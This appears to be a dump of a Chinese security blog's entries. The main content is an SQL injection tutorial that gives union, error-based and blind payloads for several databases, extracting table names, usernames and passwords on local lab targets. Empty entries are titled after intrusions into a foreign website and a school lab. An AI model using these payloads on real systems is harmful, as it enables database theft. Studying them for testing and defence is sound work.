<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and (select  ascii(substr(column_name,1,1))  from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1)=105--+<br><br></code></pre></td></tr></table></figure>

<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/31.png" alt="1646392542559"></p>
<ul>
<li>获取字段长度</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> length(id) <span class="hljs-keyword">from</span> users limit <span class="hljs-number">12</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">=</span><span class="hljs-number">2</span><span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure>

<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/32.png" alt="1646393476820"></p>
<ul>
<li>获取字段名</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and ascii(substr((select username from users limit 0,1),1,1))=68--+<br><br></code></pre></td></tr></table></figure>

<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/33.png" alt="1646458321889"></p>
<p><strong>重点：</strong></p>
<p><strong>通过查询方式与网站应用得关系注入点产生地方或应用猜测对方查询方式</strong></p>
<p><strong>例如下方的注册页面，对应的就是插入语句 insert</strong> </p>
<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/34.png" alt="1646154063954"></p>
<h3><span id="sql注入报错盲注">SQL注入—报错盲注</span></h3><p>​        盲注就是在注入过程中，获取的数据不能回显至前端页面。此时，我们需要利用一些方法进行半段或者尝试，这个过程称之为盲注。我们可以知道盲注分为以下三类：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">基于布尔的SQL盲注-逻辑判断（优先级：2）<br><br>regexp,like,ascii,left,ord,mid<br><br></code></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">基于时间的SQL盲注-延时判断（优先级：3）<br><br>if,sleep<br><br></code></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">基于报错的SQL盲注-报错回显（优先级：1）<br><br>floor，updatexml，extractvalue<br><br></code></pre></td></tr></table></figure>



<h3><span id="12种报错注入万能语句">12种报错注入+万能语句</span></h3><p><a href="https://www.jianshu.com/p/bc35f8dd4f7c">https://www.jianshu.com/p/bc35f8dd4f7c</a></p>
<h3><span id="access偏移注入"><strong>Access偏移注入</strong></span></h3><p>如果遇到列名猜解不到的情况，则可以使用Access偏移注入</p>
<ol>
<li>原理</li>
</ol>
<p><strong>借用数据库的自连接查询让数据库内部发生乱序，从而偏移出所需要的字段在我们的页面上显示</strong></p>
<ol start="2">
<li>用途</li>
</ol>
<p><strong>解决知道Access数据库中知道表名，但是得不到字段的sql注入困境</strong></p>
<ol start="3">
<li>特点</li>
</ol>
<p><strong>a. 成功与否看技巧与运气，不能保证100%成功。</strong></p>
<p><strong>b. 无需管理员账号密码字段，直接爆账号密码</strong></p>
<ol start="4">
<li>利用条件</li>
</ol>
<p><strong>a. 已知管理表名</strong></p>
<p><strong>b. 已知任意字段（一个或多个会增加机率，最常见的就是id）</strong></p>
<ol start="5">
<li>影响偏移注入成功因素</li>
</ol>
<p><strong>a. 管理表的字段数越少越好（最好是三个:id 账号字段 密码字段）</strong></p>
<p><strong>b. 当前注入点的脚本内查询的表内的字段数越多越好</strong></p>
<ol start="6">
<li>流程</li>
</ol>
<p><strong>a. 判断字段数</strong></p>
<p><strong>b. 判断表名</strong></p>
<p><strong>c. 开始偏移注入</strong></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
  </entry>
  <entry>
    <title>Metasploit系列-[Kali基础]</title>
    <url>/2022/05/01/Kali/Metasploit%E7%B3%BB%E5%88%97-%5BKali%E5%9F%BA%E7%A1%80%5D%20/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>Kali</category>
      </categories>
  </entry>
  <entry>
    <title>WEB安全系列-[XSS跨站]</title>
    <url>/2022/04/13/WEB%E5%AE%89%E5%85%A8/WEB%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BXSS%5D/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
  </entry>
  <entry>
    <title>WEB安全系列-[信息收集]</title>
    <url>/2022/04/13/WEB%E5%AE%89%E5%85%A8/WEB%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%5D/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
  </entry>
  <entry>
    <title>WEB靶场系列[sqli-labs]</title>
    <url>/2022/04/13/WEB%E9%9D%B6%E5%9C%BA/WEB%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%5Bsqli-labs%5D/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>WEB靶场</category>
      </categories>
  </entry>
  <entry>
    <title>WEB靶场系列[upload-labs]</title>
    <url>/2022/04/13/WEB%E9%9D%B6%E5%9C%BA/WEB%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%5Bupload-labs%5D/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>WEB靶场</category>
      </categories>
  </entry>
  <entry>
    <title>内网安全系列-[ARP欺骗]</title>
    <url>/2022/04/15/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BARP%E6%AC%BA%E9%AA%97%5D%20/</url>
    <content><![CDATA[<p>22222收入的分第三方</p>
]]></content>
      <categories>
        <category>内网安全</category>
      </categories>
  </entry>
  <entry>
    <title>内网安全系列-[IPC$入侵]</title>
    <url>/2022/04/13/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BIPC$%E5%85%A5%E4%BE%B5%5D/</url>
    <content><![CDATA[<p>22222收入的分第三方</p>
]]></content>
      <categories>
        <category>内网安全</category>
      </categories>
  </entry>
  <entry>
    <title>WEB实战系列-[手工注入拿下漂亮国网站]</title>
    <url>/2022/04/13/%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97/WEB%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97-%5B%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%8B%BF%E4%B8%8B%E6%BC%82%E4%BA%AE%E5%9B%BD%E7%BD%91%E7%AB%99%5D/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>黑客编程</category>
      </categories>
  </entry>
  <entry>
    <title>内网系列-[IPC轻易入侵学校机房]</title>
    <url>/2022/04/13/%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97/%E5%86%85%E7%BD%91%E7%B3%BB%E5%88%97-%5BIPC%E8%BD%BB%E6%98%93%E5%85%A5%E4%BE%B5%E5%AD%A6%E6%A0%A1%E6%9C%BA%E6%88%BF%5D/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>黑客编程</category>
      </categories>
  </entry>
  <entry>
    <title>小迪安全系列-[SQL注入]</title>
    <url>/2022/04/18/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BSQL%E6%B3%A8%E5%85%A5%5D/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1><span id="一sql注入">一：SQL注入</span></h1><blockquote>
<p>sql注入就是在数据交互中，前端数据传到后台时没有做严格的判断，导致传进来的数据被拼接到sql语句中，被当作sql语句的一部分进行执行，从而导致数据泄露，丢失甚至服务器瘫痪。如果代码中没有过滤或者过滤不严谨是会出现漏洞的。 </p>
</blockquote>
<blockquote>
<p><img src="/../../images/xdsql/1650258465529.png" alt="1650258465529"></p>
</blockquote>
<h2><span id="1-sql注入的分类">1.  SQL注入的分类</span></h2><p><strong>从注入手法分类可以分为：</strong></p>
<blockquote>
<p><strong>联合查询注入</strong></p>
<p><strong>报错型注入</strong></p>
<p><strong>布尔型注入</strong></p>
<p><strong>延时注入</strong></p>
<p><strong>堆叠注入</strong></p>
<p><strong>Cookie注入</strong></p>
<p><strong>HTTP头注入</strong></p>
<p><strong>JSON注入</strong></p>
<p><strong>POST注入</strong></p>
<p><strong>二次注入</strong></p>
<p><strong>DNS注入</strong></p>
<p><strong>宽字节注入</strong></p>
<p><strong>……</strong></p>
</blockquote>
<p><strong>从数据类型上可以分为：</strong></p>
<blockquote>
<p><strong>字符型（即输入的输入使用符号进行过滤）</strong></p>
<p><strong>数值型（即输入的输入未使用符号进行过滤）</strong></p>
</blockquote>
<p><strong>从注入位置可以分类为：</strong></p>
<blockquote>
<p><strong>GET数据（提交数据方式为GET，大多存在地址栏）</strong></p>
<p><strong>POST数据（提交数据方式为POST，大多存在输入框中）</strong></p>
<p><strong>HTTP头部（提交数据方式为HTTP头部）</strong></p>
<p><strong>cookie数据（提交数据方式为cookie）</strong></p>
</blockquote>
<h2><span id="12-判断注入点">1.2 判断注入点</span></h2><blockquote>
<p>and 1&#x3D;1 页面正常<br>and 1&#x3D;2 页面错误</p>
<p> <strong>可能存在注入，其实归根结底就是看我们的输入会不会对网站造成影响，即我们的操作有效</strong> </p>
<p>SELECT * FROM user WHERE id&#x3D;1 and 1&#x3D;1 LIMIT 0,1 正常<br>SELECT * FROM user WHERE id&#x3D;1 and 1&#x3D;2 LIMIT 0,1 错误</p>
<p>(有一个正常，整个语句都为真)<br>SELECT * FROM user WHERE id&#x3D;1 or 1&#x3D;1 LIMIT 0,1 正常<br>SELECT * FROM user WHERE id&#x3D;1 or 1&#x3D;2 LIMIT 0,1 正常</p>
</blockquote>
<h2><span id="13-判断字段数"><strong>1.3 判断字段数</strong></span></h2><p>order by 1,2,3,4</p>
<h2><span id="14-常见的sql数据库函数">1.4 常见的SQL数据库函数</span></h2><blockquote>
<ol>
<li>version()——MySQL 版本</li>
<li>user()——数据库用户名</li>
<li>database()——数据库名</li>
<li>@@datadir——数据库路径</li>
<li>@@version_compile_os——操作系统版本</li>
</ol>
</blockquote>
<h2><span id="15-判断sql数据库类型">1.5 判断SQL数据库类型</span></h2><blockquote>
<p><strong>前端与数据库类型</strong><br>asp：SQL Server，Access<br>.net：SQL Server<br>php：MySQL，PostgreSQL<br>java：Oracle，MySQL</p>
<p><strong>根据端口判断</strong><br>Oracle：默认端口1521<br>SQL Server：默认端口1433<br>MySQL：默认端口3306</p>
<p><strong>根据数据库特有函数来判断</strong><br>len和length<br>len()：SQL Server 、MySQL以及db2返回长度的函数。<br>length()：Oracle和INFORMIX返回长度的函数。</p>
<p><strong>version和@@version</strong><br>version()：MySQL查询版本信息的函数<br>@@version：MySQL和SQL Server查询版本信息的函数</p>
<p><strong>substring和substr</strong><br>MySQL两个函数都可以使用<br>Oracle只可调用substr<br>SQL Server只可调用substring</p>
<p><strong>根据特殊符号进行判断</strong><br><strong>&#x2F;</strong>*  是MySQL数据库的注释符<br><strong>–</strong>  是Oracle和SQL Server支持的注释符<br><strong>; ** 是子句查询标识符，Oracle不支持多行查询，若返回错误，则说明可能是Oracle数据库<br><strong>#</strong>  是MySQL中的注释符，返回错误则说明可能不是MySQL，另外也支持– 和&#x2F;</strong>&#x2F;</p>
</blockquote>
<h1><span id="二注入时信息收集">二：注入时信息收集</span></h1><p><img src="/../../images/xdsql/1650259113342.png" alt="1650259113342"></p>
<h3><span id="1-信息收集">1.  信息收集：</span></h3><blockquote>
<ol>
<li>version()——MySQL 版本</li>
<li>user()——数据库用户名</li>
<li>database()——数据库名</li>
<li>@@datadir——数据库路径</li>
<li>@@version_compile_os——操作系统版本</li>
</ol>
</blockquote>
<h3><span id="12-数据库注入">1.2 数据库注入：</span></h3><p> 在mysql5.0以上版本存在一个 <code>information_schema</code>的数据库，它记录着所有的数据库，表名，列名。 </p>
<p><img src="/../../images/xdsql/1650259264511.png" alt="1650259264511"></p>
<ul>
<li>数据库中“.”代表下级</li>
<li><code>select * information_schema.tables;</code>记录所有表名</li>
<li><code>where table_name=&#39;&#39;</code>筛选条件</li>
<li><code>select * from information_schema.columns;</code>记录所有的列名</li>
<li><code>where column_name=&#39;&#39;</code>筛选条件</li>
<li><code>wherw table_schema=&#39;&#39;</code>筛选条件</li>
</ul>
<blockquote>
<ol>
<li>获取所有数据库名</li>
</ol>
<p>union select 1,group_concat(schema_name),3 from information_schema.schemata</p>
<ol start="2">
<li>获取指定数据库下的表名</li>
</ol>
<p>union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;’pikachu’</p>
<ol start="3">
<li>获取指定数据库指定表名下的列名信息</li>
</ol>
<p>union select 1,group_concat(column_name),3 from information_schema.columns where  table_name&#x3D;’users’ and table_schema&#x3D;’pikachu’</p>
<ol start="4">
<li>获取指定列下的字段信息</li>
</ol>
<p>union select 1,username,password from users  LIMIT 1,1 –+</p>
</blockquote>
<h2><span id="13-information_schema-注入"><strong>1.3 information_schema 注入</strong></span></h2><h1><span id="三类型及提交注入">三：类型及提交注入</span></h1><blockquote>
<p> 在真实 SQL 注入安全测试中，我们一定要先明确提交数据及提交方 法后再进行注入，其中提交数据类型和提交方法可以通过抓包分析获取， 后续安全测试中我们也必须满足同等的操作才能进行注入</p>
</blockquote>
<h3><span id="1-简要明确参数类型"><strong>1. 简要明确参数类型</strong></span></h3><p><strong>根据网站上的参数或者值来判定注入的时候是否需要考虑符号的问题</strong></p>
<p><strong>数字，字符，搜索，JSON 等</strong></p>
<h3><span id="12数字x2f字符"><strong>1.2数字&#x2F;字符</strong></span></h3><p>数字型：基本不用引号，但是也不是绝对的，数字也可以加单引号</p>
<p>字符型：一般采用单引号，但是不单止单引号 也可以是 ‘,”,%,),}等</p>
<p><strong>即使有注入也会带入单引号里，产生不了任何作用，所以我们要做的前提是先要把它的符号闭合掉</strong></p>
<blockquote>
<p>select * from user where id &#x3D;1;</p>
<p>select * from user where name&#x3D;’xiaojun’;</p>
</blockquote>
<blockquote>
<p><img src="/../../images/xdsql/8.png" alt="8"></p>
</blockquote>
<p>$name&#x3D;$_GET[‘x’];</p>
<p>$sql&#x3D;<strong>“<strong>select * from user where name&#x3D;’$name’</strong>“;</strong></p>
<p>这样的话，注入语句就被写到单引号中了，那么这条语句就没有作用了</p>
<p>?x&#x3D;xiaojun and 1&#x3D;1</p>
<p>select * from user where name&#x3D;’xiaojun and 1&#x3D;1’</p>
<p><strong>and  1&#x3D;1原始的意义是应该拼接到SQL语句中形成一个逻辑判断的情况，由于单引号的出现导致语句写到单引号里面成为一个单纯的字符串，没有了任何意义.</strong></p>
<p><strong>根据网站自身的参数的值来判断在注人的时候是否需要考虑符合的问题。</strong></p>
<p><img src="/../../images/xdsql/9.png" alt="9"></p>
<h3><span id="13-搜索"><strong>1.3 搜索</strong></span></h3><p>​        <strong>将数据进行搜索并进行展示，搜索符号是%，在过滤的时候要过滤单引号和百分号，不然语句全部在单引号和百分号里</strong></p>
<p>select * from user where name like ‘%xiaojun%’ </p>
<h3><span id="14-简要明确请求方法"><strong>1.4 简要明确请求方法</strong></span></h3><ul>
<li><p><strong>GET,POST,COOKIE,REQUEST,HTTP 头等</strong></p>
</li>
<li><p><strong>请求方法可以通过浏览器开发者模式查看数据包的前缀</strong></p>
</li>
</ul>
<p><img src="/../../images/xdsql/10.png" alt="10"></p>
<ul>
<li><strong>一般情况下，大数据采用POST上传方式</strong></li>
</ul>
<p><strong>不同的请求方法，请求数据，类型，大小，都不一样</strong></p>
<blockquote>
<p>GET产生一个TCP数据包；POST产生两个TCP数据包。<br>         对于GET方式的请求，浏览器会把http header和data一并发送出去，服务器响应200（返回数据）；<br>          而对于POST，浏览器先发送header，服务器响应100 continue，浏览器再发送data，服务器响应200 ok（返回数据）。<br>           GET方法无法接收POST的值<br>   在POST情况下GET的值只要在网址后面就能接收<br>   GET、POST接收单个<br>   REQUEST 全部接收，网站在访问的时候由于我们大多数是黑盒测试，不知道对方代码写法，如果对方采用REQUEST接收方式，就不需要考虑用何种方法去提交，因为用GET、POST都可以。如果对方是单一接收方式，那么在注入的时候需要用它的方法去注入。</p>
</blockquote>
<h3><span id="15-get和post两种基本请求方法和区别">1.5 GET和POST两种基本请求方法和区别：</span></h3><p><a href="https://www.cnblogs.com/logsharing/p/8448446.html">https://www.cnblogs.com/logsharing/p/8448446.html</a></p>
<h3><span id="16-干扰符号">1.6 干扰符号</span></h3><p> SQL 语句干扰符号：’,”,%,),}等，具体需看写法</p>
<p>Less-1为例：</p>
<ol>
<li><p><a href="http://127.0.0.1/Less-1/?id=1&#39;">http://127.0.0.1/Less-1/?id=1&#39;</a>  and 1&#x3D;1</p>
<p>报错语句： SELECT * FROM users WHERE id&#x3D;’1’  and 1&#x3D;1’ LIMIT 0,1 </p>
<p><img src="/../../images/xdsql/11.png" alt="11"></p>
</li>
<li><p>正确的SQL语句：<a href="http://127.0.0.1/Less-1/?id=1&#39;">http://127.0.0.1/Less-1/?id=1&#39;</a>  and ‘1’&#x3D;’1</p>
</li>
</ol>
<p><img src="/../../images/xdsql/12.png" alt="12"></p>
<ol start="3">
<li>当然，这种方法显得麻烦，直接使用注释也可以起到同样的效果</li>
</ol>
<p>–+负责把后面的单引号注释掉</p>
<p><img src="/../../images/xdsql/13.png" alt="13"></p>
<h1><span id="四union注入">四：UNION注入</span></h1><p> <code>union</code>操作符用于合并两个或多个SQL语句，得到<strong>联合查询结果</strong> </p>
<blockquote>
<ol>
<li><p><strong>利用order判断字段数</strong></p>
<p>order by x(数字） 正常与错误的正常值  正确网页正常显示，错误网页报错</p>
<p>?id&#x3D;1’ order by 3–+</p>
</li>
<li><p><strong>利用 union select 联合查询，将id值设置成不成立，即可探测到可利用的字段数</strong></p>
<p>?id&#x3D;-1 union select 1,2,3 –+</p>
</li>
<li><p><strong>利用函数database(),user(),version()可以得到所探测数据库的数据库名、用户名和版本号</strong></p>
<p>?id&#x3D;-1 union select 1,database(),version() –+</p>
</li>
<li><p><strong>利用 union select 联合查询，获取表名</strong>  </p>
<p>?id&#x3D;-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’已知库名’–+</p>
</li>
<li><p><strong>利用 union select 联合查询，获取列名</strong></p>
<p>?id&#x3D;-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’已知表名’–+</p>
</li>
<li><p><strong>利用 union select 联合查询，获取字段值</strong></p>
<p>?id&#x3D;-1’ union select 1,2,group_concat(已知字段名,’:’已知字段名) from 已知表名–+</p>
</li>
</ol>
</blockquote>
<h1><span id="五-information_schema注入">五： information_schema注入</span></h1><blockquote>
<ol>
<li><strong>获取所有数据库名</strong></li>
</ol>
<p>union select 1,group_concat(schema_name),3 from information_schema.schemata</p>
<ol start="2">
<li>获取指定数据库下的表名</li>
</ol>
<p>union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;’pikachu’</p>
<ol start="3">
<li>获取指定数据库指定表名下的列名信息</li>
</ol>
<p>union select 1,group_concat(column_name),3 from information_schema.columns where  table_name&#x3D;’users’ and table_schema&#x3D;’pikachu’</p>
<ol start="4">
<li>获取指定列下的字段信息</li>
</ol>
<p>union select 1,username,password from users  LIMIT 1,1 –+</p>
</blockquote>
<h1><span id="六-常见数据库注入方法">六 常见数据库注入方法</span></h1><h3><span id="1-mysql注入">1. Mysql注入</span></h3><blockquote>
<p><strong>1.找到注入点 and 1&#x3D;1 and 1&#x3D;2 测试报错</strong></p>
</blockquote>
<blockquote>
<p>2.order by 5 # 到5的时候报错，获取字段总数为4</p>
</blockquote>
<blockquote>
<p>3.id&#x3D;0(不是1就行，强行报错) union select 1,2,3,4 # 联合查询，2和3可以显示信息</p>
</blockquote>
<blockquote>
<p>4.获取数据库信息</p>
<p>user() &#x3D;&#x3D;&gt;root</p>
<p>database() &#x3D;&#x3D;&gt;mozhe_Discuz_StormGroup</p>
<p>version() &#x3D;&#x3D;&gt;5.7.22-0ubuntu0.16.04.1</p>
</blockquote>
<blockquote>
<p>5.获取数据库表</p>
<p>table_name 表名</p>
<p>information_schema.tables 系统生成信息表</p>
<p>table_schema&#x3D;数据库名16进制或者用单引号括起来</p>
<p>改变limit 0，1中前一个参数，得到两个表 StormGroup_member notice</p>
</blockquote>
<blockquote>
<p>6.获取列名</p>
</blockquote>
<blockquote>
<p>结果如下 id,name,password,status</p>
</blockquote>
<blockquote>
<p>7.脱裤</p>
</blockquote>
<h3><span id="2access注入">2.ACCESS注入</span></h3><p><img src="/../../images/xdsql/1650295362245.png" alt="1650295362245"></p>
<blockquote>
<p>1.and 1&#x3D;2 报错找到注入点</p>
<p>2.order by 获取总字段</p>
<p>3.猜解表名 and exists (select * from admin) 页面返回正常，说明存在admin表</p>
<p>4.猜解列名 and exists(select id from admin) 页面显示正常，admin表中存在id列 username,passwd 同样存在</p>
<p>5.脱裤 union select 1,username,passwd,4 from admin</p>
</blockquote>
<h3><span id="3-sql-server">3. Sql Server</span></h3><h2><span id="sql-serverx2fmssql注入">SQL server&#x2F;MSSQL注入</span></h2><ol>
<li>介绍</li>
</ol>
<p>Microsoft SQL Server 是一个全面的数据库平台，使用集成的商业智能 (BI)工具提供了企业级的数据管理。Microsoft  SQL Server 数据库引擎为关系型数据和结构化数据提供了更安全可靠的存储功能，使您可以构建和管理用于业务的高可用和高性能的数据应用程序。</p>
<ol>
<li>过程</li>
</ol>
<p><strong>①</strong>判断数据库类型</p>
<p>and exists (select * from sysobjects)–返回正常为mssql（也名sql server）</p>
<p>and exists (select count(*) from sysobjects)–有时上面那个语句不行就试试这个哈</p>
<p><strong>②</strong>判断数据库版本</p>
<p>​    and 1&#x3D;@@version–这个语句要在有回显的模式下才可以哦</p>
<p>​    and substring((select  @@version),22,4)&#x3D;’2008’–适用于无回显模式，后面的2008就是数据库版本，     返回正常就是2008的复制代码第一条语句执行效果图（类似）：第二条语句执行效果图：（如果是        2008的话就返回正常）</p>
<p><strong>③</strong>获取所有数据库的个数 (一下3条语句可供选择使用)  </p>
<p>\1. and 1&#x3D;(select quotename(count(name)) from master..sysdatabases)–</p>
<p>\2. and 1&#x3D;(select cast(count(name) as varchar)%2bchar(1) from master..sysdatabases) –</p>
<p>\3. and 1&#x3D;(select str(count(name))%2b’|’ from master..sysdatabases where dbid&gt;5) –</p>
<p>​     and 1&#x3D;(select cast(count(name) as varchar)%2bchar(1) from master..sysdatabases where dbid&gt;5) –</p>
<p>说明：dbid从1-4的数据库一般为系统数据库.</p>
<p><strong>⑤</strong>获取数据库 （该语句是一次性获取全部数据库的，且语句只适合&gt;&#x3D;2005，两条语句可供选择使用）  </p>
<p>​    and 1&#x3D;(select quotename(name) from master..sysdatabases FOR XML PATH(‘’))–</p>
<p>​    and 1&#x3D;(select ‘|’%2bname%2b’|’ from master..sysdatabases FOR XML PATH(‘’))–</p>
<p><strong>⑥</strong>获取当前数据库 </p>
<p>and db_name()&gt;0</p>
<p>and 1&#x3D;(select db_name())–</p>
<p><strong>⑦</strong>获取当前数据库中的表（有2个语句可供选择使用）【下列语句可一次爆数据库所有表（只限于  mssql2005及以上版本）】</p>
<p>​    and 1&#x3D;(select quotename(name) from 数据库名..sysobjects where xtype&#x3D;’U’ FOR XML PATH(‘’))– </p>
<p>​     and 1&#x3D;(select ‘|’%2bname%2b’|’ from 数据库名..sysobjects where xtype&#x3D;’U’  FOR XML PATH(‘’))–</p>
<p><strong>⑧</strong>获得表里的列</p>
<p>一次爆指定表的所有列（只限于mssql2005及以上版本）：</p>
<p>​     and 1&#x3D;(select quotename(name) from 数据库名..syscolumns where id &#x3D;(select  id from 数据库名..sysobjects where name&#x3D;’指定表名’) FOR XML PATH(‘’))– </p>
<p>​     and 1&#x3D;(select ‘|’%2bname%2b’|’ from 数据库名..syscolumns where id &#x3D;(select  id from 数据库名..sysobjects where name&#x3D;’指定表名’) FOR XML PATH(‘’))–</p>
<p>⑨获取指定数据库中的表的列的数据库</p>
<p>逐条爆指定表的所有字段的数据（只限于mssql2005及以上版本）：</p>
<p>​    and 1&#x3D;(select top 1 * from 指定数据库..指定表名 where排除条件 FOR XML PATH(‘’))–</p>
<p>一次性爆N条所有字段的数据（只限于mssql2005及以上版本）：</p>
<p>​     and 1&#x3D;(select top N * from 指定数据库..指定表名 FOR XML PATH(‘’))–复制代码第一条语句：and  1&#x3D;(select top 1 * from 指定数据库..指定表名 FOR XML  PATH(‘’))–测试效果图：———————————-加上where条件筛选结果出来会更加好，如：where  and name like ‘%user%’ 就会筛选出含有user关键词的出来。用在筛选表段时很不错。</p>
<p>转自：<a href="http://www.myhack58.com/Article/html/3/8/2015/63146.htm">http://www.myhack58.com/Article/html/3/8/2015/63146.htm</a></p>
<h3><span id="4-oracle数据库">4. Oracle数据库</span></h3><p><a href="https://www.cnblogs.com/peterpan0707007/p/8242119.html">https://www.cnblogs.com/peterpan0707007/p/8242119.html</a></p>
<h3><span id="5-mongodb">5. MongoDB</span></h3><blockquote>
<p>1.id&#x3D;1′ 单引号注入报错</p>
<p>2.闭合语句，查看所有集合</p>
<p>3.查看指定集合的数据</p>
<p>[0] 代表第一条数据，可递增</p>
</blockquote>
<h3><span id="6-db2">6. DB2</span></h3><blockquote>
<p>1.and 1&#x3D;2 判断注入点</p>
<p>2.order by N 获取字段数</p>
<p>3.爆当前数据库</p>
<p>GAME_CHARACTER</p>
<p>4.列表</p>
<p>NAME</p>
<p>5.脱裤</p>
</blockquote>
<h3><span id="7-sqlite">7. SQLite：</span></h3><blockquote>
<p>1.找注入点 and 1&#x3D;1</p>
<p>2.order by N 猜字段 4</p>
<p>3.猜数据库</p>
<p>offset &#x3D;&#x3D;&gt;0~2</p>
<p>有三个数据库：</p>
<p>WSTMart_reg</p>
<p>notice_sybase</p>
<p>sqlite_sequence</p>
<p>4.猜列</p>
<p>共有3个字段：</p>
<p>id,name,password</p>
<p>5.脱裤</p>
</blockquote>
<h3><span id="8-postgrasql注入原理">8. PostgraSQL注入原理</span></h3><p><a href="https://www.webshell.cc/524.html">https://www.webshell.cc/524.html</a></p>
<p><a href="https://www.cnblogs.com/yilishazi/p/14710349.html">https://www.cnblogs.com/yilishazi/p/14710349.html</a></p>
<p><a href="https://www.jianshu.com/p/ba0297da2c2e">https://www.jianshu.com/p/ba0297da2c2e</a></p>
<h1><span id="七注入工具">七：注入工具</span></h1><h3><span id="11-sqlmap">1.1 SQLmap</span></h3><p>● –is-dba 当前用户权限（是否为root权限）<br>● –dbs 所有数据库<br>● –current-db 网站当前数据库<br>● –users 所有数据库用户<br>● –current-user 当前数据库用户<br>● –random-agent 构造随机user-agent<br>● –passwords 数据库密码<br>● –proxy <a href="http://local:8080/">http://local:8080</a> –threads 10 (可以自定义线程加速) 代理<br>● –time-sec&#x3D;TIMESEC DBMS响应的延迟时间（默认为5秒）</p>
<p><img src="/../../images/xdsql/14.png" alt="14"></p>
<h1><span id="八盲注">八：盲注</span></h1><p>​    当进行SQL注入时，有很多注入会出现无回显的情况，其中不回显的原因可能是SQL语句查询方式的问题导致，这个时候我们需要用到相关的报错或盲注进行后续操作，同时作为手工注入时，提前了解或预知其SQL语句大概写法也能更好的选择对应的注入语句</p>
<p><strong>涉及知识点：</strong></p>
<ul>
<li><p><strong>报错盲注</strong></p>
</li>
<li><p><strong>延迟盲注</strong></p>
</li>
<li><p><strong>布尔盲注</strong></p>
</li>
</ul>
<p><strong>ASCCI码表</strong></p>
<p><img src="/../../images/xdsql/ascci.png" alt="1646537964629"></p>
<h3><span id="1-报错盲注">1. 报错盲注</span></h3><p>​    <strong>盲注就是在注入过程中，获取的数据不能回显至前端页面。此时，我们需要利用一些方法进行半段或者尝试，这个过程称之为盲注。我们可以知道盲注分为以下三类：</strong></p>
<p>分享一个讲的不错的视频：</p>
<iframe src="//player.bilibili.com/player.html?aid=715622672&bvid=BV12Q4y1o7Ya&cid=338198345&page=17" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" height="500" width="800"> </iframe>
重点理解:
我们可以通过以上查询方式与网站应用的关系，注入点产生地方或应用猜测到对方的SQL查询方式 

<p><strong>SQL语句</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs sqlite">select 查询数据<br>在网站应用中进行数据显示查询效果<br>例： select * from news wher id=$id<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs mssql">insert 插入数据<br><br>在网站应用中进行用户注册添加等操作<br>例：insert into news(id,url,text) values(2,&#x27;x&#x27;,&#x27;$t&#x27;)<br></code></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">delete</span> 删除数据<br><br>后台管理里面删除文章删除用户等操作<br>例：<span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> news <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span>$id<br></code></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">update</span> 更新数据<br><br>会员或后台中心数据同步或缓存等操作<br>例：<span class="hljs-keyword">update</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">set</span> pwd<span class="hljs-operator">=</span><span class="hljs-string">&#x27;$p&#x27;</span> <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">and</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;admin&#x27;</span><br></code></pre></td></tr></table></figure>

